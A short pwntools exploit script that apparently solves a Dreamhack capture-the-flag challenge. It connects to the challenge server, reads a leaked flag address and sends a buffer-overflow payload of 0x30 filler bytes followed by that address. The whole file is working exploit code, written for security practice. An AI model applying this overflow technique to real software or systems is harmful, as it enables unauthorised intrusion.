from pwn import *

exe = ELF('./chall', checksec = False)

# p = process(exe.path)
p = remote("host8.dreamhack.games", 14165)

p.recvuntil(b'(mmapped address): ')
flag_addr = int(p.recvline()[:-1], 16)
log.info("real flag addr: " + hex(flag_addr))

input()
payload = b'a'*0x30
payload += p64(flag_addr)

p.sendlineafter(b'input: ', payload)

p.interactive()